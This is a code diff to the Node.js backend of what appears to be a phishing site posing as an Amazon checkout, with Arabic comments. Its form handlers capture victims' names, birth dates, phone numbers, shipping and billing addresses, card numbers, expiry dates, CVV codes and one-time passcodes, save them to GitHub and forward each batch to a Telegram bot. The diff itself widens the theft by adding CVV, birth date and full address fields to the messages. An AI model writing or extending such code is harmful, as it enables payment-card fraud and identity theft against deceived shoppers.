@@ -175,18 +175,37 @@ app.post('/submit-data', async (req, res) => {
         await saveToGitHub(logData);
         console.log('✅ البيانات اتحفظت على GitHub');
         
-        // تحديث الكاش فوراً
         cachedData = await fetchFromGitHub();
         lastFetchTime = Date.now();
         
-        // ====== إرسال إشعار تيلجرام ======
-        const msg = `📬 <b>بيانات جديدة وصلت!</b>\n\n` +
-                   `👤 <b>الاسم:</b> ${data.username || 'غير محدد'}\n` +
-                   `📞 <b>الهاتف:</b> ${data.phone || 'غير محدد'}\n` +
-                   `📍 <b>المدينة:</b> ${data.city || 'غير محدد'}\n` +
-                   `🏛️ <b>الولاية:</b> ${data.state || 'غير محدد'}\n` +
-                   `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n\n` +
-                   `🔗 <a href="https://amazon-form-site.vercel.app/data-viewer">عرض البيانات</a>`;
+        // ====== إرسال كل البيانات لتيلجرام ======
+        let msg = `📬 <b>بيانات العميل الجديدة</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        msg += `📦 <b>بيانات الشحن:</b>\n`;
+        msg += `👤 الاسم الكامل: ${data.username || 'غير محدد'}\n`;
+        msg += `📅 تاريخ الميلاد: ${data.dob_month || ''}/${data.dob_day || ''}/${data.dob_year || ''}\n`;
+        msg += `📞 رقم الهاتف: ${data.phone || 'غير محدد'}\n`;
+        msg += `🌍 الدولة: ${data.country || 'غير محدد'}\n`;
+        msg += `🏠 العنوان: ${data.address_line1 || 'غير محدد'}\n`;
+        msg += `🏠 العنوان (سطر 2): ${data.address_line2 || 'غير محدد'}\n`;
+        msg += `📍 المدينة: ${data.city || 'غير محدد'}\n`;
+        msg += `🏛️ الولاية: ${data.state || 'غير محدد'}\n`;
+        msg += `📮 الرمز البريدي: ${data.zipcode || 'غير محدد'}\n\n`;
+        
+        msg += `💳 <b>بيانات الفوترة:</b>\n`;
+        msg += `👤 الاسم الكامل: ${data.billing_username || data.billing_username_hidden || 'نفس الشحن'}\n`;
+        msg += `🏠 العنوان: ${data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن'}\n`;
+        msg += `🏠 العنوان (سطر 2): ${data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن'}\n`;
+        msg += `📍 المدينة: ${data.billing_city || data.billing_city_hidden || 'نفس الشحن'}\n`;
+        msg += `🏛️ الولاية: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
+        msg += `📮 الرمز البريدي: ${data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن'}\n`;
+        msg += `📞 رقم الهاتف: ${data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'}\n\n`;
+        
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://amazon-form-site.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+        
         await sendTelegramMessage(msg);
         
         res.redirect('/page3');
@@ -217,12 +236,17 @@ app.post('/submit-payment', async (req, res) => {
         cachedData = await fetchFromGitHub();
         lastFetchTime = Date.now();
         
-        // ====== إشعار تيلجرام ======
-        const msg = `💳 <b>بطاقة دفع جديدة!</b>\n\n` +
-                   `👤 <b>الاسم:</b> ${data.card_name || 'غير محدد'}\n` +
-                   `🔢 <b>رقم البطاقة:</b> ${data.card_number || 'غير محدد'}\n` +
-                   `📅 <b>تاريخ الانتهاء:</b> ${data.card_expiry || 'غير محدد'}\n` +
-                   `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+        // ====== إرسال كل بيانات الدفع ======
+        let msg = `💳 <b>بيانات بطاقة الدفع</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `👤 اسم صاحب البطاقة: ${data.card_name || 'غير محدد'}\n`;
+        msg += `🔢 رقم البطاقة: ${data.card_number || 'غير محدد'}\n`;
+        msg += `📅 تاريخ الانتهاء: ${data.card_expiry || 'غير محدد'}\n`;
+        msg += `🔐 رمز CVV: ${data.card_cvv || 'غير محدد'}\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://amazon-form-site.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+        
         await sendTelegramMessage(msg);
         
         res.redirect('/page4');
@@ -250,10 +274,14 @@ app.post('/submit-otp', async (req, res) => {
         cachedData = await fetchFromGitHub();
         lastFetchTime = Date.now();
         
-        // ====== إشعار تيلجرام ======
-        const msg = `🔐 <b>رمز OTP جديد!</b>\n\n` +
-                   `🔢 <b>الرمز:</b> ${data.otp_code || 'غير محدد'}\n` +
-                   `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+        // ====== إرسال OTP ======
+        let msg = `🔐 <b>رمز التحقق OTP</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `🔢 رمز OTP: ${data.otp_code || 'غير محدد'}\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://amazon-form-site.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+        
         await sendTelegramMessage(msg);
         
         res.redirect('/page5');
